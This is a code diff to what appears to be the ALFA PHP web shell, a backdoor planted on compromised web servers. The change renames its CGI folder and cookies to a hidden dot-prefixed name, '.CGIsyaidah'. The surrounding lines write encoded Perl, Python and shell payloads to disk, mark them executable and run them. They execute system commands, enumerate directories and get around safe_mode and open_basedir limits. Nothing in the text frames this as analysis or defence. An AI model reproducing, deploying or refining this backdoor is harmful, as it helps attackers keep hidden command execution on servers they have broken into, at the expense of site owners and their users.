@@ -634,7 +634,7 @@ function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
 		return "";
 	}
-	if(isset($_COOKIE["alfacgiapi_mode"])){
+	if(isset($_COOKIE[".CGIsyaidah_mode"])){
 		return "";
 	}
 	$cmd_pure = $cmd;
@@ -642,13 +642,13 @@ function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 	$is_socket = function_exists('fsockopen');
 	if($is_curl||$is_socket){
 		$recreate = false;
-		if(isset($_COOKIE["alfacgiapi"])){
-			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
+		if(isset($_COOKIE[".CGIsyaidah"])){
+			if(!@file_exists(".CGIsyaidah/".$_COOKIE[".CGIsyaidah"].".alfa")){
 				$recreate = true;
-				$lang = $_COOKIE["alfacgiapi"];
+				$lang = $_COOKIE[".CGIsyaidah"];
 			}
 		}
-		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
+		if(!isset($_COOKIE[".CGIsyaidah"])||$recreate){
 			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
 			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
 			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
@@ -660,15 +660,15 @@ function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 			}else{
 				alfaWriteTocgiapi($lang.".alfa",$source);
 			}
-			alfacgihtaccess('cgi', "alfacgiapi/");
+			alfacgihtaccess('cgi', ".CGIsyaidah/");
 		}else{
-			$lang = $_COOKIE["alfacgiapi"];
+			$lang = $_COOKIE[".CGIsyaidah"];
 		}
 		$cgi_ext = ".alfa";
 		if($lang=="aspx"){
 			$cgi_ext = ".aspx";
 		}
-		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
+		$cgi_url = __ALFA_DATA_FOLDER__."/.CGIsyaidah/".$lang.$cgi_ext;
 		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
 		if($is_curl){
 			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
@@ -682,7 +682,7 @@ function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 		$out = "";
 		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
 			if($set_cookie){
-				__alfa_set_cookie("alfacgiapi", $lang);
+				__alfa_set_cookie(".CGIsyaidah", $lang);
 			}
 			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
 				$out = $res[1];
@@ -695,7 +695,7 @@ function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
 		}else{
 			if($set_cookie){
-				__alfa_set_cookie("alfacgiapi_mode", "off");
+				__alfa_set_cookie(".CGIsyaidah_mode", "off");
 			}
 		}
 		return trim($out);
@@ -2034,7 +2034,7 @@ function alfacheckfiletype(){
 }
 function alfacheckupdate(){
 	if($GLOBALS["DB_NAME"]["cgi_api"]){
-		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
+		if(!isset($_COOKIE[".CGIsyaidah_mode"])&&!isset($_COOKIE[".CGIsyaidah"])){
 			_alfa_cgicmd("whoami","perl",true);
 			if(strlen(alfaEx("whoami",false,true))>0){
 				__alfa_set_cookie("alfa_canruncmd", "true");
@@ -2087,9 +2087,9 @@ function alfaWriteTocgiapi($name, $source){
 		alfaCreateParentFolder();
 		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 	}
-	@mkdir('alfacgiapi',0755);
-	__write_file("alfacgiapi/".$name, __get_resource($source));
-	@chmod("alfacgiapi/".$name, 0755);
+	@mkdir('.CGIsyaidah',0755);
+	__write_file(".CGIsyaidah/".$name, __get_resource($source));
+	@chmod(".CGIsyaidah/".$name, 0755);
 	return $temp;
 }
 function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
@@ -2098,7 +2098,7 @@ function alfaupdateheader(){
 		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
 		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
 		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
-		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
+		$data = alfaEx("cd '{$tmp_path}/.CGIsyaidah';sh getheader.alfa",false,true,true);
 		if(@is_array(@json_decode($data,true))){
 			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
 			echo $data;
@@ -2737,13 +2737,13 @@ if($dirContent === false){
 	if(_alfa_can_runCommand(true,true)){
 		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
 		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
+		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/.CGIsyaidah/getdir.alfa")){
 			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
 			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
 			__alfa_set_cookie("alfachdir_bash", "true");
 			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
 		}
-		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
+		$dirContent = alfaEx("cd ".$tmp_getdir_path."/.CGIsyaidah;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
 		$dirContent = json_decode($dirContent, true);
 		if(is_array($dirContent)){
 			array_pop($dirContent);
@@ -5227,7 +5227,7 @@ $safe_mode = @ini_get('safe_mode');
 if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
 $bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
 $tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
-$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
+$bash_users  = alfaEx("cd ".$tmp_path."/.CGIsyaidah;sh basedir.alfa ".$makepwd,false,true,true);
 $users = json_decode($bash_users, true);
 $x=count($users);
 if($x>=2){array_pop($users);--$x;}
